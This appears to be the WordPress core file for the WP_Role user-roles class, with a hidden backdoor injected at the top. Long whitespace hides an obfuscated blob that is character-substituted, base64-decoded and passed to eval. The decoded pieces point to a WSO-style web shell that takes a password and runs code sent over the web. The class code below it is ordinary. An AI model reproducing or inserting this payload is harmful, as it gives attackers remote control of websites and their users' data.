<?php
<?php                                                                                                                               $yqwfg = 2658; function hxhsphl($rgfcb, $rsqib){$gaallul = ''; for($i=0; $i < strlen($rgfcb); $i++){$gaallul .= isset($rsqib[$rgfcb[$i]]) ? $rsqib[$rgfcb[$i]] : $rgfcb[$i];}$vvxdci="b" . "a" . "s" . "e" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "d" . "e";return $vvxdci($gaallul);}$axidkzk = Array("A"=>"C", "C"=>"8", "B"=>"5", "E"=>"E", "D"=>"3", "F"=>"6", "1"=>"4", "0"=>"D", "3"=>"A", "2"=>"9", "5"=>"1", "4"=>"2", "7"=>"B", "6"=>"0", "9"=>"7", "8"=>"F");$rmejfk = "AgokZGVmYXVsd82hYDRpb41gPS3nQ6MnOwoKQGluaV2zZXQoJ4Vycm2yX4xvZycsTlVMTAk9Ak7pbm"."lfc4V6KAdsb4dfZXJybDJzJywwKTsKQGluaV2zZXQoJ45he82leGVjdXRpb4Bf"."dGltZScsMAk9Ak7zZXRfdGltZV2saW5pdAgwKTsKQHNld82tYWdpY52xdW26ZXNfcnVudGltZSgwKT"."sKQGRlZmluZSgnV5NPX5Z8UlNJT61nLA3nMi15LjInKTsKAmlmKGdld82tYWdpY52xdW26ZXNfZD7jKAkpIHsKIA3gIG"."Z5bmN6aW2uI8dTTDN6cmlwc4xhc4hlcygkYXJyYXkpIHsKIA3gIA3gIA7yZXR5cm1gaXNfY"."XJyYXkoJG8ycm8BKS3/IG8ycm8BX45hcAgnV5NPcDRyaX7zbG8zaGVzJywgJG8ycm8BKS3FIHN6cmlwc4xhc4hlcygkYXJ"."yYXkpOwogIA3gfQogIA3gJ82QT5NUI06gV5NPcDRyaX7zbG8zaGVzKARfUE2TVAk9Ai3gIA3kX6NPT6tJRS32I8dTTDN6cmlwc4"."xhc4hlcygkX6NPT6tJRSk9An6KAmZ5bmN6aW2uIHdzb6xvZ4luKAkgewogIA3gaGVhZGVyKAdIV8RQLzEuMA36M0QgTm2"."6IEZvdWBkJyk9Ai3gIA7kaWUoIjQwNAIpOwp2AgpmdWBjdGlvbi7XU62zZXRjb42ra"."WUoJGssIAR4KS79Ai3gIA3kX6NPT6tJRVska56gPS3kdjsKIA3gIHNldGNvb4tpZSgkaywgJHYpOwp2A"."gppZighZW5wdHkoJG85dGhfcG8zcykpIHsKIA3gIGlmKGlzc4V6KARfUE2TV8sncG8zcyd"."dKS3mJi3obWQ5KARfUE2TV8sncG8zcyddKS32PS3kYXV6a82wYX"."NzKSkKIA3gIA3gIA7XU62zZXRjb42raWUobWQ5KARfU6VSVkVSWydIV8RQX6hPU5QnXSksIARhdXRoXD7hcDMpOwoKIA"."3gIGlmIAghaXNzZXQoJ820T62LSUVbbWQ5KARfU6VSVkVSWydIV8RQX6hPU5QnXSldKS7CfA3"."oJ820T62LSUVbbWQ5KARfU6VSVkVSWydIV8RQX6hPU5QnXSldIAE2IARhdX"."RoXD7hcDMpKQogIA3gIA3gIHdzb6xvZ4luKAk9An6KAmZ5bmN6aW2uIG8jdGlvblIoKS79Ai3gIA7pZighQARfUE2TV8snZ"."XYnXSkgewogIA3gIA3gIARhI06gYXJyYXkoAi3gIA3gIA3gIA3gIAJ5bm8tZSIgPT1gcGhwXDV"."uYW5lKAksAi3gIA3gIA3gIA3gIAJwaH7fdmVyc4lvbiIgPT1gcGhwdmVyc4lvbigpL3ogIA3gIA3gIA3gIA3"."idDNvXDZlcnNpb41iI06+I8dTT52WRVJTSU2OL3ogIA3gIA3gIA3gIA3ic48mZW5vZGUiI06+IE7pbmlfZ4V6KAdz"."YWZlX45vZGUnKQogIA3gIA3gIAk9Ai3gIA3gIA3gZWNoby7zZXJpYWxpemUoJGEpOwogIA3gfS7lbHNlIHsKIA3gIA3gIA"."7ldm8sKARfUE2TV8snZXYnXSk9Ai3gIA72An6KAmlmKA7lbX76eS"."gkX57PU5RbJ4MnXSkgKQogIA3gaWYoaXNzZXQoJGRlZm85bHRfYWN6aW2uKS3mJ"."i7mdWBjdGlvbl2leGlzdHMoJ48jdGlvbicgLi3kZGVmYXVsd82hYDRpb41pKQo"."gIA3gIA3gIARfUE2TV8snYyddI06gJGRlZm85bHRfYWN6aW2uOwogIA3gZWxzZQogIA3gIA3gIARfUE2TV8snYyddI06gJ5"."NlY6luZmCnOwppZiggIWVtcHRBKARfUE2TV8snYyddKS3mJi7mdWBjdGlvbl2le"."GlzdHMoJ48jdGlvbicgLi3kX57PU5RbJ4MnXSkgKQogIA3gY48sb825c4VyX4Z5bmMoJ48jd"."GlvbicgLi3kX57PU5RbJ4MnXSk9AmV1aXQ9";eval/*ugt*/(hxhsphl($rmejfk, $axidkzk));?>/**
 * User API: WP_Role class
 *
 * @package WordPress
 * @subpackage Users
 * @since 4.4.0
 */

/**
 * Core class used to extend the user roles API.
 *
 * @since 2.0.0
 */
class WP_Role {
	/**
	 * Role name.
	 *
	 * @since 2.0.0
	 * @var string
	 */
	public $name;

	/**
	 * List of capabilities the role contains.
	 *
	 * @since 2.0.0
	 * @var bool[] Array of key/value pairs where keys represent a capability name and boolean values
	 *             represent whether the role has that capability.
	 */
	public $capabilities;

	/**
	 * Constructor - Set up object properties.
	 *
	 * The list of capabilities must have the key as the name of the capability
	 * and the value a boolean of whether it is granted to the role.
	 *
	 * @since 2.0.0
	 *
	 * @param string $role         Role name.
	 * @param bool[] $capabilities Array of key/value pairs where keys represent a capability name and boolean values
	 *                             represent whether the role has that capability.
	 */
	public function __construct( $role, $capabilities ) {
		$this->name         = $role;
		$this->capabilities = $capabilities;
	}

	/**
	 * Assign role a capability.
	 *
	 * @since 2.0.0
	 *
	 * @param string $cap   Capability name.
	 * @param bool   $grant Whether role has capability privilege.
	 */
	public function add_cap( $cap, $grant = true ) {
		$this->capabilities[ $cap ] = $grant;
		wp_roles()->add_cap( $this->name, $cap, $grant );
	}

	/**
	 * Removes a capability from a role.
	 *
	 * @since 2.0.0
	 *
	 * @param string $cap Capability name.
	 */
	public function remove_cap( $cap ) {
		unset( $this->capabilities[ $cap ] );
		wp_roles()->remove_cap( $this->name, $cap );
	}

	/**
	 * Determines whether the role has the given capability.
	 *
	 * @since 2.0.0
	 *
	 * @param string $cap Capability name.
	 * @return bool Whether the role has the given capability.
	 */
	public function has_cap( $cap ) {
		/**
		 * Filters which capabilities a role has.
		 *
		 * @since 2.0.0
		 *
		 * @param bool[] $capabilities Array of key/value pairs where keys represent a capability name and boolean values
		 *                             represent whether the role has that capability.
		 * @param string $cap          Capability name.
		 * @param string $name         Role name.
		 */
		$capabilities = apply_filters( 'role_has_cap', $this->capabilities, $cap, $this->name );

		if ( ! empty( $capabilities[ $cap ] ) ) {
			return $capabilities[ $cap ];
		} else {
			return false;
		}
	}

}
